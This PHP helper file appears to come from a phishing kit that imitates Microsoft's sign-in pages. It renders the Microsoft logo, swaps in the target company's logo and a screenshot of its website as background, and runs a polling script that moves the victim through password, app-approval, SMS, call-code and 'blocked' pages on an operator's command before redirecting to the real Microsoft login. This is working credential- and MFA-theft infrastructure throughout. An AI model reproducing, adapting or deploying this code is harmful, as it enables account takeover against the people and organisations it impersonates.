<?php
// helpers.php — Shared shell, Microsoft logo, reusable components

/* ── Excluded domains: get logo only, NO background screenshot ── */
function get_no_bg_domains(): array {
    return [
        'gmail.com','googlemail.com',
        'yahoo.com','ymail.com',
        'hotmail.com','outlook.com','live.com','msn.com','live.co.uk',
        'hotmail.co.uk','hotmail.fr','hotmail.de',
        'aol.com',
        'icloud.com','me.com','mac.com',
        'protonmail.com','proton.me',
        'mail.com','zoho.com','gmx.com','gmx.net',
    ];
}

/* ── Build screenshot URL for a domain (browser fetches this directly) ── */
function screenshot_url(string $domain): string {
    // thum.io: free, no API key, browser-accessible
    // PHP just outputs this URL into CSS — the BROWSER fetches it, not the server
    return 'https://image.thum.io/get/width/1280/crop/800/noanimate/https://' . $domain;
}

/* ── Microsoft four-square logo ── */
function ms_logo(): string {
    return '<svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg" style="margin-bottom:20px;display:block">
  <rect x="0"  y="0"  width="11" height="11" fill="#F25022"/>
  <rect x="12" y="0"  width="11" height="11" fill="#7FBA00"/>
  <rect x="0"  y="12" width="11" height="11" fill="#00A4EF"/>
  <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
  <text x="28" y="17" font-family="\'Segoe UI\',Arial,sans-serif" font-size="15" font-weight="600" fill="#1b1b1b">Microsoft</text>
</svg>';
}

/* ── Back arrow with email ── */
function back_email(string $email): string {
    $e = htmlspecialchars($email);
    return '<a href="index.php" class="back-email">← ' . $e . '</a>';
}

/* ── Company logo HTML — shown on all pages if domain has a logo ── */
function company_logo_html(): string {
    if (session_status() === PHP_SESSION_NONE) session_start();
    $logo_url     = $_SESSION['domain_logo'] ?? '';
    $domain       = $_SESSION['domain']      ?? '';
    $company_name = $_SESSION['domain_name'] ?? '';

    if (!$logo_url || !$domain) return ms_logo();

    // Always show company logo — even for personal email domains
    // (gmail.com has a logo, aol.com has a logo, etc.)
    $safe_logo = htmlspecialchars($logo_url, ENT_QUOTES);
    $safe_name = htmlspecialchars($company_name, ENT_QUOTES);

    // Render company logo with MS logo fallback if image fails
    return '<div style="margin-bottom:20px;min-height:36px;display:flex;align-items:center">
  <img id="company_logo"
       src="' . $safe_logo . '"
       alt="' . $safe_name . '"
       style="height:36px;width:auto;max-width:180px;object-fit:contain;display:block"
       onerror="this.style.display=\'none\';document.getElementById(\'ms_logo_fb\').style.display=\'block\'"
  />
  <div id="ms_logo_fb" style="display:none">' . ms_logo() . '</div>
</div>';
}

/* ── Error icon ── */
function err_icon(): string {
    return '<svg width="13" height="13" viewBox="0 0 24 24" fill="#d93025" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="11"/><path d="M12 7v6" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/><circle cx="12" cy="17.5" r="1.2" fill="#fff"/></svg>';
}

/* ── Domain background <style> block ──
   PHP outputs the URL — the BROWSER fetches the screenshot image directly.
   thum.io blocks server-side curl but serves browsers fine. ── */
function domain_bg_style(): string {
    if (session_status() === PHP_SESSION_NONE) session_start();

    $domain = $_SESSION['domain'] ?? '';
    $bg_url  = $_SESSION['domain_bg'] ?? '';
    // If session explicitly cleared bg, respect it
    if ($bg_url === '') return '';
    if (!$domain) return '';

    // Skip background for personal/common email providers
    if (in_array(strtolower($domain), get_no_bg_domains())) return '';

    // Build screenshot URL — browser will fetch this, not the server
    $shot_url = screenshot_url($domain);
    $safe     = htmlspecialchars($shot_url, ENT_QUOTES);

    return '<style>
/* ── Company domain background (loaded by browser from thum.io) ── */
.page-bg {
    background-image: url("' . $safe . '") !important;
    background-size: cover !important;
    background-position: center center !important;
    background-color: #0d1117 !important;
    animation: none !important;
}
/* Dark overlay so card stays readable over the screenshot */
.page-bg::before {
    content: "" !important;
    position: fixed !important;
    inset: 0 !important;
    background: rgba(0,0,0,0.52) !important;
    z-index: 0 !important;
    pointer-events: none !important;
    height: 100% !important;
}
/* Ensure card, footer stay above overlay */
.card-wrap,
.card,
.page-footer { position: relative !important; z-index: 2 !important; }
</style>
';
}

/* ── Page open (shared HTML shell) ── */
function page_open(string $title, bool $poll = false, bool $force_default_bg = false): void {
    // Ensure session is started so domain_bg_style() can read session vars
    if (session_status() === PHP_SESSION_NONE) session_start();

    $poll_js  = $poll ? '<script>window.__POLL=true;</script>' : '';
    // $force_default_bg = true means NEVER apply screenshot (used by index.php)
    $bg_style = $force_default_bg ? '' : domain_bg_style();
    $logo_js  = logo_persist_js();   // keeps logo across pages

    echo '<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
  <meta name="theme-color" content="#f3f3f3"/>
  <title>' . htmlspecialchars($title) . ' | Microsoft</title>
  <link rel="stylesheet" href="style.css"/>
  ' . $poll_js . '
  ' . $bg_style . '
</head>
<body>
<div class="page-bg">
  <div class="card-wrap">
';
}

/* ── Small JS snippet: reads logo from sessionStorage so it shows on every page ── */
function logo_persist_js(): string {
    if (session_status() === PHP_SESSION_NONE) session_start();
    $logo = htmlspecialchars($_SESSION['domain_logo'] ?? '', ENT_QUOTES);
    if (!$logo) return '';
    return '<script>window.__COMPANY_LOGO="' . $logo . '";</script>';
}

/* ── Poll script for verify pages ── */
function _poll_script(array $stay = []): string {
    $stay_json = json_encode($stay);
    return '<script>
(function(){
  const STAY=' . $stay_json . ';
  const MAP={
    "loading":"loading.php","approve_app":"approve-app.php",
    "verify_code":"verify-code.php","text_code":"text-code.php",
    "call_code":"call-code.php","pw_error":"password.php",
    "password":"password.php","blocked":"blocked.php",
  };
  let r=false;
  function poll(){
    if(r)return;
    fetch("poll.php?t="+Date.now(),{cache:"no-store"})
      .then(x=>x.json()).then(d=>{
        if(r)return;
        if(d.page==="success"){r=true;location.replace("https://login.microsoftonline.com/");return;}
        if(STAY.includes(d.page))return;
        const dest=MAP[d.page];
        if(dest){r=true;location.replace(dest);}
      }).catch(()=>{});
  }
  setInterval(poll,1200);poll();
})();
</script>';
}

/* ── Page close ── */
function page_close(): void {
    echo '  </div><!-- /.card-wrap -->
  <footer class="page-footer">
    <a href="#">Terms of use</a>
    <a href="#">Privacy &amp; cookies</a>
    <span class="footer-dots">· · ·</span>
  </footer>
</div><!-- /.page-bg -->
<script src="script.js"></script>
</body>
</html>';
}